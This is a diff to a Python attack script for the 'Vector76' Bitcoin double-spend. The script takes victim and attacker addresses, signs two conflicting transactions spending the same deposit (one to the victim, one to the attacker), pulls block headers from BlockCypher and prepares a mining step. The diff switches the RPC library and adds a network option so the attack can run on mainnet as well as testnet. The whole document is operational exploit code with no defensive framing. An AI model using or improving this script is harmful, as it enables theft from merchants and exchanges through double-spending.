@@ -1,16 +1,15 @@
 import time
 import argparse
-import bitcoin.blocks
+import bitcoin
 import requests
 import subprocess
 import bitcoin.rpc
 
 from datetime import datetime
 from hashlib import sha256
-#from bitcoincli import Bitcoin
-#from bitcoinaddress import Wallet
 from bitcoin_tools.core.transaction import TX
 from bitcoin_tools.core.keys import load_keys
+from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -40,10 +39,10 @@ parser.add_argument("amount_of_coins",
 parser.add_argument("prev_deposit_TXID",
                     help="Last deposit TXID of first attacker address",
                     type=str)
-#parser.add_argument("--network",
-#                    help="mainnet or testnet. (Default = testnet)",
-#                    type=str,
-#                    default="testnet")
+parser.add_argument("--network",
+                    help="mainnet or testnet. (Default = test3)",
+                    type=str,
+                    default="test3")
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
@@ -61,9 +60,9 @@ def broadcast_transaction(raw_tx):
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
-def get_block_header_by_txid(txid):
+def get_block_header_by_txid(txid, network):
     # URL to get transaction information
-    tx_url = f'https://api.blockcypher.com/v1/btc/main/txs/{txid}'
+    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
     
     # Request transaction information
     tx_response = requests.get(tx_url)
@@ -80,7 +79,7 @@ def get_block_header_by_txid(txid):
         return
     
     # URL to get block information
-    block_url = f'https://api.blockcypher.com/v1/btc/main/blocks/{block_hash}'
+    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
     
     # Request information about a block
     block_response = requests.get(block_url)
@@ -141,17 +140,15 @@ victim_address   = args.victim_address
 attacker_address = args.attacker_address
 amount_BTC = args.amount_of_coins
 prev_txid  = args.prev_deposit_TXID
-#network = args.network
+network = args.network
 
-#if (network != "mainnet") and (network != "testnet"):
-#    network = "testnet"
-#
-#print(f"[+] {network} Mode.")
-#if network == "mainnet":
+if (network != "main") and (network != "test3"):
+    network = "test3"
+
+print(f"[+] {network} Mode.")
 
 print("Connecting Node...")
-rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}", service_port=rpc_port)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
-
+rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}")#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
 print(rpc_node.getrawtransaction(prev_txid))
 print()
 fee_satoshi = 1500
@@ -163,7 +160,7 @@ send_amount = amount_satoshi - fee_satoshi
 tx_victim = TX.build_from_io(prev_txid, 0, send_amount, victim_address)
 tx_victim = tx_victim.sign(sk, 0).serialize()
 print(tx_victim)
-block_header_V = get_block_header_by_txid(prev_txid)
+block_header_V = get_block_header_by_txid(prev_txid, network)
 print("Mining Vector76 Block...")
 tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
 tx_attacker = tx_attacker.sign(sk, 0).serialize()
